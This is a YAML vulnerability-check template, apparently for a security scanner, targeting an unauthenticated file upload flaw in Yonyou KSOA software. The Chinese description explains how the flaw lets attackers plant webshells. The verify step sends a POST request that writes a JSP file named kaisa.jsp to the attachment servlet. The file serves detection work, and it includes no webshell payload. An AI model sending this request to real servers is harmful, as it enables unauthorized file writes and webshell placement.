app: 用友软件
query: app:"用友软件"
meta:
  name: 用友时空KSOA Attachment 文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 该漏洞的原理在于用友时空设备开放了文件上传功能，但未鉴权且上传的文件类型、大小、格式、路径等方面进行严格的限制和过滤，导致攻击者可以通过构造恶意文件并上传到设备上，然后利用该漏洞获取权限并执行任意命令。攻击者有可能会上传一个包含Webshell的文件，通过Webshell来执行一系列操作，比如查看敏感信息、窃取设备管理员密码等。
  homepage: ""
  author: X prism
  references: ""
  solution: 安装最新版补丁
  create_at: "2024-07-13 01:33:14"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /servlet/com.sksoft.bill.Attachment?action=write&filename=kaisa.jsp
          redirect: true
          header: []
          params: test
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: <root>
          type: contains
        - name: body
          value: .jsp
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
